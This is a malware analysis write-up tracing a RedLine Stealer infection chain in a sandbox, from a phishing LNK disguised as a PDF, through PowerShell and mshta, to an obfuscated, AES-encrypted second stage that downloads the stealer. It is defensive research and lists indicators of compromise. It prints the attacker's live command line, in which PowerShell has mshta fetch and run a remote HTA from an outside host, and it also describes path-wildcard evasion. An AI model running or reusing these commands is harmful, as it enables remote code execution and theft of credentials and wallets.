# RedLine Stealer infection chain analysis using AnyRun Sandbox

## Overview of RedLine Stealer :

- RedLine Stealer, an infostealer malware first identified in March 2020, specializes in extracting valuable information and assets from compromised systems, primarily targeting end users. Commonly distributed through compromised software downloads, phishing attempts, and drive-by downloads, RedLine Stealer focuses on pilfering insecure passwords and cryptocurrency wallets. Beyond these targets, it possesses the capability to harvest an array of system information, including IP addresses, usernames, keyboard layouts, and installed security solutions. Moreover, it can serve as a vehicle for distributing additional malware, such as ransomware, exacerbating the potential damage.
 
- More information on the RedLine Stealer and its trends can be found in ANY.RUN’s Malware Trends. RedLine is top trending malware in 2023.

- https://any.run/malware-trends/redline

![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/da455b4c-dd0a-46ec-a629-62b92140dbef)

## RedLine Infection Vectors :

- RedLine's versatility is evident in its diverse delivery mechanisms, It is used in multiple smaller campaigns by individuals who have purchased the malware from the underground malware forums. Due to this, there are a wide range of known infection vectors. Only few of them are stated below:
 
  - Trojanizing as popular services like Telegram, Signal, or Discord to create seemingly legitimate installers.
  - Email phishing campaigns aimed at luring victims into downloading the malware.
  -	Exploitation of Google Ads while hosting Trojanized or fake websites.
  -	Social engineering tactics targeting digital artists using Non-Fungible Tokens (NFTs).
  -	Distribution through malware loaders, expanding its reach across various compromised systems.

## Sample Collection and Preparation for Analysis :

### AnyRun :

> https://app.any.run/tasks/5a51d459-6caa-47dd-9b27-715ca2ec92bb/             

> https://app.any.run/tasks/6212356e-6b48-4e80-b0fc-8c3dd5111e1d/

### MalwareBazaar

> https://bazaar.abuse.ch/sample/3086ac8861aaccdf3dc45f3b1380b6cd70169c7d9fc16f098f5a1d08736fed61/

## Analysis :

- The infection chain unfolds as follows:
 
  ***`LNK -> PS -> mshta.exe (URL1) -> PS -> cmd.exe -> PS (obfuscate + b64 + AES-decrypt) -> URL2 (exe)`***
 
- The initial payload is distributed via a phishing email containing a ZIP file. Once the ZIP file is extracted, you'll come across an LNK file that appears as a PDF symbol.

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/659ea9a9-24b8-4432-b310-e7ede57cf94a)

- Following the execution of the LNK file, it utilizes PowerShell to initiate the execution of mshta.exe. 

- Mshta.exe is a Windows-native binary designed to execute Microsoft HTML Application (HTA) files. As its full name implies, Mshta can execute Windows Script Host code (VBScript and JScript) embedded within HTML in a network proxy-aware fashion.

- To avoid detection, attackers are using the path (\W*\2\msh*e) instead of the standard path - C:\Windows\System32\mshta.exe.

  **Command Line -** ***`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \W*\\\*2\\\msh*e ('http'+'://thanhancompany.com/ta/line'+'.hta')`***

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/d2256dce-b51b-4bfd-94b0-aa409bafb609)

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/faa42324-2cd6-4106-a125-0ef89810469d)

- The mshta.exe establishes a connection with the URL specified in the LNK file and execute the hta file.
 
  **Command Line -** ***`"C:\Windows\System32\mshta.exe" http[://]thanhancompany[.]com[/]ta[/]line[.]hta`***

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/4933084e-1cfa-4cb4-af7b-f3018f39fb01)

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/b2d33313-9731-4fd6-b750-4c146b340612)

- The HTA script uses the VBScript ‘chr’ function to obfuscate by translating ASCII codes into characters. VBScript often employs the 'chr' function to obfuscate its code, where 'chr' converts Ascii codes to characters e.g. Chr(65) will return 'A'. 

-	In this script it uses simple subtraction before converting the character to Ascii using chr.

  **Reference Link -** https://isvbscriptdead.com/vbs-obfuscator/
 
-	Two methods can deobfuscate this script:
 
      1. Using CyberChef.
 
      2. Save the HTA content as a new file. Replace instances of 'Execute' with 'Wscript.Echo' within the resulting VBS file. Running the modified file using cscript.exe reveals the deobfuscated script.

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/0957627c-5657-411d-9db2-9058a56f6ef4)

-	In the AnyRun sandbox you will get you the deobfuscated script from the following Process 3008.

-	This deobfuscated hta script contains 2nd stage obfuscated PowerShell script which utilize AES decryption along with Gzip decompress and then execute using cmd.exe.

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/336ba7ba-1ee3-40bf-b4f2-75b057854d95)

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/a3591110-db01-4956-8c4c-29df047907a4)


-	We will dump 2nd stage PowerShell script simply writing Write-Host at the bottom of the script and execute it.

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/70ec5fcf-f104-4422-a71e-027cfe7afca9)

-	2nd stage PowerShell first opens Blank pdf and after then connects to the below URL and download ReadiLine Stealer and execute it.

   **URL –** ***`https[://]hiqsolution[.]com`***

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/2e102262-fb99-4f81-b5d3-6986cb33dadc)

-	Below snap shows the blank pdf opened after 2nd stage execution.

  ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/d71d80a6-ba56-49ef-8ec3-ea3197f89e8b)


## IOC’s :

AnyRun Report (https://any.run/report/1bf287baf71f2a0872005e73399685df6b3a2b27cb2f27511deb4bdf566fbe67/5a51d459-6caa-47dd-9b27-715ca2ec92bb?_gl=1*cmzv32*_gcl_au*NjY1NzUzNzkuMTY5NzIxMzg3MA..*_ga*MTk4MTUxNzQ0LjE2NzQ4MzE3MjM.*_ga_53KB74YDZR*MTcwMzgzNjIwNy4zNy4xLjE3MDM4Mzg2MTYuMC4wLjA)


## References :

- CyberChef Receipes : https://github.com/Securityinbits/malware-analysis/blob/main/analysis/redline_stealer_aug_2023.md
  
